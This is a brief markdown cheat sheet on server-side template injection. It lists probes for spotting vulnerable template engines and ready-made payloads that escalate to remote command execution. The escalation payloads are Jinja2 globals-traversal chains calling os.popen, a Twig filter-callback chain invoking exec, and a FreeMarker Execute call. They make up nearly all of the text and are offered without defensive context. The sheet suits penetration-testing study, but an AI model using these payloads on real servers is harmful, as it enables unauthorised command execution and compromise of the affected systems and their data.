# SSTI (Server-Side Template Injection)

## Detection
```bash
{{7*7}}              # Jinja2/Twig — returns 49
#{7*7}               # Ruby
${{7*7}}             # Freemarker
{{7*'7'}}            # Jinja2 (returns '7777777')
<%= 7*7 %>           # ERB (Ruby)
${7*7}               # JSP
```

## SSTI to RCE (Jinja2/Python)
```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
```

## SSTI to RCE (Twig/PHP)
```
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

## SSTI to RCE (FreeMarker/Java)
```java
${"freemarker.template.utility.Execute"?new()("id")}
```
